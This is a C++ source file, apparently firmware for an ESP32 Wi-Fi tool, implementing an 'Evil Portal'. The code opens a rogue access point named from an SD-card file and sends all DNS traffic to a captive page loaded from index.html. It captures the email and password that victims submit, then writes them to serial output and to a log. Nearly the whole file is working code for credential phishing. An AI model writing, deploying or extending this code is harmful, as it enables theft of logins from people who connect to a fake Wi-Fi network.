#include "EvilPortal.h"

AsyncWebServer server(80);

EvilPortal::EvilPortal() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;
}

bool EvilPortal::begin(LinkedList<ssid>* ssids) {
  // wait for init flipper input
  if (!this->setAP())
    return false;
  if (!this->setHtml())
    return false;
    
  startPortal();
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", this->index_html);
    Serial.println("client connected");
  });

  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      this->user_name = inputMessage;
      this->name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      this->password = inputMessage;
      this->password_received = true;
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
  Serial.println("web server up");
}

bool EvilPortal::setHtml() {
  Serial.println("Setting HTML...");
  #ifndef WRITE_PACKETS_SERIAL
    File html_file = sd_obj.getFile("/index.html");
    if (!html_file) {
      #ifdef HAS_SCREEN
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setTextSize(1);
        display_obj.tft.println("Could not find /index.html. Touch to exit...");
      #endif
      Serial.println("Could not find /index.html. Exiting...");
      return false;
    }
    else {
      if (html_file.size() > MAX_HTML_SIZE) {
        #ifdef HAS_SCREEN
          display_obj.tft.setCursor(0, 100);
          display_obj.tft.setFreeFont(NULL);
          display_obj.tft.setTextSize(1);
          display_obj.tft.println("The provided HTML is too large.");
          display_obj.tft.println("The Byte limit is " + (String)MAX_HTML_SIZE);
          display_obj.tft.println("Touch to exit...");
        #endif
        Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE);
        return false;
      }
      String html = "";
      while (html_file.available()) {
        char c = html_file.read();
        if (isPrintable(c))
          html.concat(c);
      }
      strncpy(this->index_html, html.c_str(), strlen(html.c_str()));
      this->has_html = true;
      Serial.println("html set");
      html_file.close();
      return true;
    }
  #else
    return false;
  #endif

}

bool EvilPortal::setAP() {
  #ifndef WRITE_PACKETS_SERIAL
    File ap_config_file = sd_obj.getFile("/ap.config.txt");
    if (!ap_config_file) {
      #ifdef HAS_SCREEN
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setTextSize(1);
        display_obj.tft.println("Could not find /ap.config.txt.\nTouch to exit...");
      #endif
      Serial.println("Could not find /ap.config.txt. Exiting...");
      return false;
    }
    else {
      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
        #ifdef HAS_SCREEN
          display_obj.tft.setCursor(0, 100);
          display_obj.tft.setFreeFont(NULL);
          display_obj.tft.setTextSize(1);
          display_obj.tft.println("The provided AP name is too large.");
          display_obj.tft.println("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
          display_obj.tft.println("Touch to exit...");
        #endif
        Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE);
        return false;
      }
      String ap_config = "";
      while (ap_config_file.available()) {
        char c = ap_config_file.read();
        Serial.print(c);
        if (isPrintable(c))
          ap_config.concat(c);
      }
      strncpy(this->apName, ap_config.c_str(), strlen(ap_config.c_str()));
      this->has_ap = true;
      Serial.println("ap config set");
      ap_config_file.close();
      return true;
    }
  #else
    return false;
  #endif

}

void EvilPortal::startAP() {
  Serial.print("starting ap ");
  Serial.println(this->apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(this->apName);

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  this->runServer = true;
}

void EvilPortal::convertStringToUint8Array(const String& str, uint8_t*& buf, uint32_t& len) {
  len = str.length(); // Obtain the length of the string

  buf = new uint8_t[len]; // Dynamically allocate the buffer

  // Copy each character from the string to the buffer
  for (uint32_t i = 0; i < len; i++) {
    buf[i] = static_cast<uint8_t>(str.charAt(i));
  }
}

void EvilPortal::addLog(String log, int len) {
  //uint8_t *buf;
  //log.getBytes(buf, strlen(log.c_str()));  
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  if (save_packet) {
    uint8_t* logBuffer = nullptr;
    uint32_t logLength = 0;
    this->convertStringToUint8Array(log, logBuffer, logLength);
    
    #ifdef WRITE_PACKETS_SERIAL
      buffer_obj.addPacket(logBuffer, logLength, true);
    #elif defined(HAS_SD)
      sd_obj.addPacket(logBuffer, logLength, true);
    #else
      return;
    #endif
  }
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    if (display_obj.display_buffer->size() == 0)
    {
      display_obj.loading = true;
      display_obj.display_buffer->add(display_string);
      display_obj.loading = false;
    }
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode == WIFI_SCAN_EVIL_PORTAL) {
    this->dnsServer.processNextRequest();
    if (this->name_received && this->password_received) {
      this->name_received = false;
      this->password_received = false;
      String logValue1 =
          "u: " + this->user_name;
      String logValue2 = "p: " + this->password;
      String full_string = logValue1 + " " + logValue2 + "\n";
      Serial.print(full_string);
      this->addLog(full_string, full_string.length());
    }
  }
}